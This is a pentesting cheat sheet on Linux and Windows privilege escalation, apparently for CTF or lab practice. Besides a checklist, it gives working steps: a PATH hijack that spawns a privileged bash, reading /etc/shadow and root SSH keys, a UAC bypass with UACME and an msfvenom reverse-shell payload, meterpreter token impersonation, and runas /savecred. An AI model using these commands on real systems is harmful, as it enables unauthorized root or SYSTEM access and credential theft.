# Privilege Escalation
### Linux
- `sudo -l `
  - setenv?
- SUID/GUID
- Look for capabilities
- History Files
- Docker group
- Cron jobs
- SSH Keys
- PATH
- NFS
- Writable /etc/shadow
- Writable /etc/passwd
- Are there scripts that use commands?
  - If the command is executed without full path you can modify PATH variable
  - ` strings <program_name> `
  - you see ` tail -f /var/log/nginx/access.log `
  - ```
    #!/bin/bash
    /bin/bash -p
    ```
  - ` chmod +x /tmp/tail `
  - ` export PATH=/tmp:$PATH `
  - ` ./<program_name> `
- Is there a database? Can I access to it?
  - Look at config file or source code of webpages connecting to db
- Look at the source code of the php,py,jsp ... files of the website
  - Especially login files. Any password?
- Writable authorized_key folder?
  - generate new ssh keys
- Can I read some file with sudo?
  - /root/root.txt, /etc/shadow, /root/.ssh/id_rsa
- Can I write a file in the root user directory?
  - generate ssh key with ssh-keygen and save it in the root user dir
- Kernel Exploits
- Linpeas.sh
- [GTFObins](https://gtfobins.github.io)



### Windows 
<details>
<summary>UAC Bypass</summary>
  
- User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
- UACME
  - Prerequisites:
    1.  User must be a member of the Administrators group.
       - `net localgroup administrators`
    2. Full interactive shell with the victim (a common nc.exe shell is not enough).
       - You can use meterpreter
  - Procedure
    1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
       - `ps` to show process 
       - (ex. `migrate <PID explorer.exe>`)
    3. Upload Akagi (Akagi64.exe if x64)
    3. Create payload with msfvenom
       - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
    5. Use exploit/multi/handler to start a listener
    6. Akagi64.exe 23 <payload_full_path>
       - **NOTE FULL PATH**
    7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
      
</details>

<details>
<summary>Impersonate Tokens</summary>
  
- With msfconsole: `load incognito`
- `list_tokens -u`
- `impersonate_token <token_name>`
- You may need to migrate process to a <user> process
  - Ex. `getpid` -> 2628, `ps` ->
    |PID  | PPID | Name | Arch | Session | User | Path|
    | ---  | --- | --- | ---  | --- | --- | --- |
    |2628 | 4780 | WHAYQtsbkO.exe |  | 1 | | |
    |... | ... | ... | ... | ... | ... | ... |
    |2948 | 2036 | explorer.exe | X64 | 1 | ATTACKDEFENSE\Administrator | C:\Windows\explorer.exe |
- `getpid 2948`
- Of course you can repeat the process to become NT AUTHORITY\SYSTEM

</details>
- Powershell History
- Saved Windows Credentials
  - cmdkey /list
  - runas /savecred /user:admin cmd.exe
- Scheduled Tasks
- Insecure Permissions on Service Executable
- Unquoted Service Paths
- Insecure Service Permissions
- Windows Privileges
- Unpatched Software

# Resource
Resource | Description 
--- | ---
[GTFOBins](https://gtfobins.github.io/) | GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | Linux Privilege Escalation Awesome Script
[pspy](https://github.com/DominicBreuker/pspy) | Monitor linux processes without root permissions
[Priv2Admin](https://github.com/gtworek/Priv2Admin)  | Windows Privileges with Windows OS privileges

